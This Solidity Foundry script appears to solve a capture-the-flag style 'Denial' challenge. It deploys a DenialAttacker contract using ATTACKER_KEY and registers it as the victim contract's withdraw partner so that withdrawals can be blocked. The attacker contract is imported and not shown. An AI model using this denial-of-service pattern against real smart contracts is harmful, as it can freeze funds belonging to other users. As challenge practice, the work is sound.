// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";
import {DenialAttacker} from "../src/DenialAttacker.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttackerExecuter is Script, HelperConfigLib {
    function run(address _victimContractAddr) external {
        vm.startBroadcast(ATTACKER_KEY);
        IDenial iDenial = IDenial(_victimContractAddr);
        DenialAttacker attackContract = new DenialAttacker();

        iDenial.setWithdrawPartner(address(attackContract));

        vm.stopBroadcast();
    }
}
